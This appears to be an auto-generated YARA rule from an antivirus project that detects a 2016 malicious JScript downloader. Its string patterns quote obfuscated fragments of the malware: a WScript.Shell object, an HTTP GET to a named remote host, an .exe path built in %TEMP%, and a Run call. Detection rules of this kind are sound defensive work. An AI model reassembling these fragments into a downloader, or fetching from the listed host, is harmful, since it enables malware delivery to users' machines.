rule sig_20160401_edc0050256cee903bddd9b1f338cd417 {
  meta:
    description = "datamaliciousorder - file 20160401_edc0050256cee903bddd9b1f338cd417.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "18efb420d8eb44a580b8e2cf791ddabe0aeaba70fb0f35521dc8f63b8862ead7"

  strings:
    $s1  = "var LcBmn = function XeFpl() {return WScript[TgbRc](\"WScript\"+\".Shell\");}(), NhdMt = 11;" fullword ascii
    $s2  = "function DeKnm(LwFzr, VbXw){UhkFo = UhkFo * 1; return LwFzr - VbXw;};" fullword ascii
    $s3  = "if (KkoWf[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "KkoWf[LrEr](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s5  = "function UiGyp(){return WnlLke + \"\";};" fullword ascii
    $s6  = "function JcSh() {return LcBmn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MIOnYjauesOlE4ke.ex\" + \"e\";};" fullword ascii
    $s7  = "function ExmUkp() {return ((DdtHu == true) && (DdtHu == ZqSxx)) ? 1 : UhkFo;};" fullword ascii
    $s8  = "function NpXiw(){return 23;};" fullword ascii
    $s9  = "function CjJm(OmcWx) {var WcPh = (1, 2, 3, 4, 5, OmcWx); return WcPh;};" fullword ascii
    $s10 = "DdtHu = true; " fullword ascii
    $s11 = "var ScDla = new this[\"Date\"]();" fullword ascii
    $s12 = "var ZqSxx = false;" fullword ascii
    $s13 = "var QgXi = false;" fullword ascii
    $s14 = "function SeKwe(){return TgbRc;};" fullword ascii
    $s15 = "function AofJs(WfFxu){LcBmn[\"R\"+\"un\"](WfFxu, UhkFo, UhkFo);};" fullword ascii
    $s16 = "return DeKnm(QegTu, VqmLry);" fullword ascii
    $s17 = "ZqSxx = true; " fullword ascii
    $s18 = "var DdtHu = false;" fullword ascii
    $s19 = "function GncQvx()" fullword ascii
    $s20 = "}while (MsUd);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}